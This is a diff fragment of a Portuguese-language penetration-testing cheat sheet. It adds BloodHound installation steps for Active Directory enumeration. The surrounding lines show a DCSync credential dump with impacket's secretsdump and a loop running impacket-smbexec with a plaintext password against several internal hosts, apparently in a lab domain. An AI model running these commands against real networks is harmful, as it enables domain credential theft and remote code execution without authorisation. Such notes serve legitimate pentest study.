@@ -9219,6 +9219,18 @@ Gerar arquivo Criptografado com tipo de imagem para o pentest
 	DCSYNC: export KRB5CCNAME=administrator@CIFS_ingleses.praias.floripa.local@PRAIAS.FLORIPA. LOCAL.ccache
 	python3 secretsdump.py -k -no-pass -dc-ip 'ingleses.praias.floripa.local'@'ingleses.praias.floripa.local
 
+
+- Bloodhound
+
+Ferarmenta de enumeração do AD
+
+	sudo apt install bloodhound
+	sudo neo4j console
+	ACESSA A WEB http://localhost:7474/ LOGIN: neo4j PASS: neo4j
+	sudo nano /etc/bhapi/bhapi.json PASTE the new password before running bloodhound
+	bloodhound	
+
+
 ATAQUES GERAIS AO SMB
 
 	for i in {100,110,120.220,230};do impacket-smbexec praias/sampaio:sexywolfy@192.168.161.$i ;done
